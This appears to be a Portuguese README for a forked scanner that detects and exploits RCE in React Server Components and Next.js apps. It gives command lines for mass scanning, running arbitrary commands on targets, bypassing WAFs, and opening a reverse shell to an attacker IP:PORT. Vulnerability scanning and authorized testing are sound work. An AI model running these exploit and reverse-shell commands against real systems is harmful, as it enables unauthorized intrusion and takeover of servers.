# React2Shell Scanner

High Fidelity Detection for RSC/Next.js RCE

Scanner para detecção de vulnerabilidades de Remote Code Execution (RCE) em aplicações React Server Components e Next.js.

## Sobre

O React2Shell Scanner é uma ferramenta especializada para identificar vulnerabilidades de execução remota de código (RCE) em aplicações que utilizam React Server Components (RSC) e Next.js. A ferramenta detecta vulnerabilidades relacionadas aos seguintes CVEs:

- CVE-2025-55182
- CVE-2025-66478

A ferramenta realiza verificações de alta fidelidade utilizando side-channel detection e proof-of-concept de RCE, com capacidade de extrair resultados dinâmicos de comandos executados através do parse automático das respostas HTTP.

Esta é uma versão editada por @imguimoraes do scanner original desenvolvido pela Assetnote Security Research Team. O PoC RCE original foi criado por @maple3142.

## Características

- Detecção de alta fidelidade usando side-channel e PoC RCE
- Execução multi-threaded para scan em massa
- Extração dinâmica de resultados de comandos executados (parse automático de headers e corpo da resposta)
- WAF bypass com dados aleatórios configuráveis
- Suporte para Windows (PowerShell) e Linux/Unix (shell)
- Output em JSON estruturado para análise posterior
- Seguimento automático de redirects
- Interface com progress bar e output colorido

## Instalação

### Requisitos

- Python 3.8 ou superior
- pip (gerenciador de pacotes Python)

### Instalação de Dependências

```bash
pip install requests tqdm
```

Ou usando o arquivo requirements.txt:

```bash
pip install -r requirements.txt
```

## Uso

### Sintaxe Básica

```
python scanner.py [-u URL | -l FILE] [opções]
```

### Verificar uma única URL

```bash
python scanner.py -u https://example.com
```

### Verificar múltiplas URLs

```bash
python scanner.py -l hosts.txt
```

## Opções de Linha de Comando

### Opções de Entrada (obrigatório uma delas)

| Opção | Descrição |
|-------|-----------|
| `-u, --url URL` | URL ou host único para verificar |
| `-l, --list FILE` | Arquivo contendo lista de hosts (um por linha) |

### Opções de Execução

| Opção | Descrição |
|-------|-----------|
| `-t, --threads N` | Número de threads concorrentes (padrão: 10) |
| `--timeout SECONDS` | Timeout das requisições em segundos (padrão: 10) |
| `-k, --insecure` | Desabilitar verificação de certificado SSL (habilitado por padrão) |

### Opções de Output

| Opção | Descrição |
|-------|-----------|
| `-o, --output FILE` | Arquivo de saída para resultados em formato JSON |
| `--all-results` | Salvar todos os resultados no arquivo, não apenas vulneráveis |
| `-v, --verbose` | Output verboso (mostra snippets de resposta para análise) |
| `-q, --quiet` | Modo silencioso (mostra apenas hosts vulneráveis) |
| `--no-color` | Desabilitar output colorido |

### Opções de Headers

| Opção | Descrição |
|-------|-----------|
| `-H, --header "Key: Value"` | Adicionar header HTTP customizado (pode ser usado múltiplas vezes) |

### Opções de Exploit

| Opção | Descrição |
|-------|-----------|
| `--safe-check` | Usar detecção side-channel segura ao invés de PoC RCE (não executa código) |
| `--windows` | Usar payload PowerShell ao invés de shell Unix (para ambientes Windows) |
| `--waf-bypass` | Adicionar dados aleatórios ao payload para bypass de WAF (padrão: 128KB) |
| `--waf-bypass-size KB` | Tamanho dos dados aleatórios em KB para bypass de WAF (padrão: 128) |
| `--payload COMMAND` | Comando customizado para executar no RCE (padrão: `echo $((41*271))`) |
| `--reverse-shell IP:PORT` | Criar conexão reverse shell para IP:PORT especificado |

## Exemplos de Uso

### Exemplo 1: Scan básico de um host

```bash
python scanner.py -u https://target.com
```

### Exemplo 2: Scan em massa com múltiplas threads

```bash
python scanner.py -l targets.txt -t 50 --timeout 15
```

### Exemplo 3: Scan com output em JSON

```bash
python scanner.py -l targets.txt -o results.json --all-results
```

### Exemplo 4: Scan com headers customizados

```bash
python scanner.py -u https://target.com -H "Authorization: Bearer token" -H "User-Agent: CustomAgent"
```

### Exemplo 5: Scan com payload customizado

```bash
python scanner.py -u https://target.com --payload "whoami"
```

### Exemplo 6: Scan com WAF bypass

```bash
python scanner.py -l targets.txt --waf-bypass --waf-bypass-size 256
```

### Exemplo 7: Scan em ambiente Windows

```bash
python scanner.py -u https://target.com --windows --payload "whoami"
```

### Exemplo 8: Scan com safe check (não invasivo)

```bash
python scanner.py -l targets.txt --safe-check
```

### Exemplo 9: Scan verboso completo

```bash
python scanner.py -l targets.txt -v --all-results -o full_scan.json
```

### Exemplo 10: Estabelecer reverse shell

```bash
python scanner.py -u https://target.com --reverse-shell 192.168.1.100:4444
```

## Formato de Output

### Output no Terminal

O scanner exibe resultados com códigos de cores indicando o status:

- **[VULNERABLE]** - Host vulnerável (vermelho)
- **[NOT VULNERABLE]** - Host não vulnerável (verde)
- **[ERROR]** - Erro durante a verificação (amarelo)

Para hosts vulneráveis, o resultado do comando executado é exibido quando disponível através da extração automática do header `X-Action-Redirect` ou do corpo da resposta.

### Formato JSON

Quando a opção `-o` é utilizada, o output é salvo em formato JSON com a seguinte estrutura:

```json
{
  "scan_time": "2025-01-XXT00:00:00.000000Z",
  "total_results": 10,
  "results": [
    {
      "host": "https://target.com",
      "vulnerable": true,
      "status_code": 307,
      "final_url": "https://target.com/",
      "command_result": "11111",
      "timestamp": "2025-01-XXT00:00:00.000000Z",
      "request": "POST / HTTP/1.1\r\n...",
      "response": "HTTP/1.1 307 Temporary Redirect\r\n...",
      "error": null
    }
  ]
}
```

**Campos do resultado:**

- `vulnerable`: `true` se vulnerável, `false` se não vulnerável, `null` se ocorreu erro
- `command_result`: Resultado do comando executado extraído da resposta (quando disponível)
- `final_url`: URL final testada (após seguimento de redirects se habilitado)
- `status_code`: Código HTTP da resposta
- `request`: Requisição HTTP completa enviada
- `response`: Resposta HTTP recebida (primeiros 2000 caracteres)
- `error`: Mensagem de erro se houver
- `timestamp`: Timestamp UTC da verificação

## Funcionalidades Técnicas

### Métodos de Detecção

O scanner oferece dois métodos de detecção:

1. **Safe Check** (`--safe-check`): Detecção side-channel não invasiva que verifica padrões de erro na resposta sem executar código. Útil para scan inicial sem impacto.

2. **RCE PoC**: Execução real de código remoto com extração dinâmica dos resultados. Utiliza payloads baseados em Node.js child_process para execução de comandos do sistema.

### Extração de Resultados

O scanner realiza parse automático das respostas HTTP para extrair resultados de comandos executados:

- Extração do header `X-Action-Redirect` (formato: `NEXT_REDIRECT;push;/login?a=<result>;307;`)
- Extração do corpo da resposta (formato: `E{"digest":"<result>"}` ou `1:E{"digest":"<result>"}`)
- Funciona com qualquer comando/payload customizado através do parâmetro `--payload`

A extração é realizada dinamicamente, não dependendo de valores fixos, permitindo validar a execução de qualquer comando.

### WAF Bypass

Quando a opção `--waf-bypass` é utilizada:

- Adiciona dados aleatórios (junk data) ao início do payload multipart/form-data
- Tamanho configurável através de `--waf-bypass-size` (padrão: 128KB)
- Útil para contornar filtros de WAF que inspecionam conteúdo do request body
- Timeout é automaticamente aumentado para 20 segundos quando WAF bypass está ativo

### Payloads Customizados

O parâmetro `--payload` permite especificar qualquer comando a ser executado:

- Padrão: `echo $((41*271))` (resultado: 11111)
- Windows: Use comandos PowerShell quando `--windows` estiver ativo
- Linux/Unix: Use comandos shell padrão

O resultado do comando é automaticamente extraído e exibido, independente do valor retornado.

### Reverse Shell

A opção `--reverse-shell` permite estabelecer uma conexão reverse shell:

- Formato: `IP:PORT` (exemplo: `192.168.1.100:4444`)
- Utiliza Node.js net e child_process modules
- Para Windows: spawna `powershell.exe`
- Para Linux/Unix: spawna `/bin/sh`

## Avisos Legais e Éticos

Esta ferramenta é destinada exclusivamente para fins educacionais e testes de segurança autorizados.

- Use apenas em sistemas que você possui ou possui permissão explícita e por escrito para testar
- O uso não autorizado desta ferramenta é ilegal e pode resultar em responsabilização criminal
- Os desenvolvedores não assumem qualquer responsabilidade pelo uso indevido desta ferramenta
- Sempre obtenha autorização escrita antes de realizar testes de penetração
- Respeite as leis e regulamentações aplicáveis em sua jurisdição

## Créditos

### Exploit Original

O exploit RCE original foi criado por [@maple3142](https://x.com/maple3142).

### Scanner Original

O scanner original foi desenvolvido pela **Assetnote Security Research Team**:
- Repositório: https://github.com/assetnote/react2shell-scanner/
- Website: https://www.assetnote.io/

### Esta Versão

Esta versão editada mantém as funcionalidades do scanner original com melhorias adicionais:
- Extração dinâmica de resultados de comandos (parse automático de respostas)
- Suporte a comandos customizados com extração de resultados
- Remoção do Vercel Bypass (Patched in ??/??/2025)
- Sistema de Reverse Shell (Crash-Friendly)

Editado por: [guiimoraes](https://github.com/guiimoraes)

### CVEs Relacionados

- CVE-2025-55182
- CVE-2025-66478


Se encontrar bugs ou tiver sugestões de melhorias, por favor abra uma issue no repositório descrevendo o problema de forma detalhada.
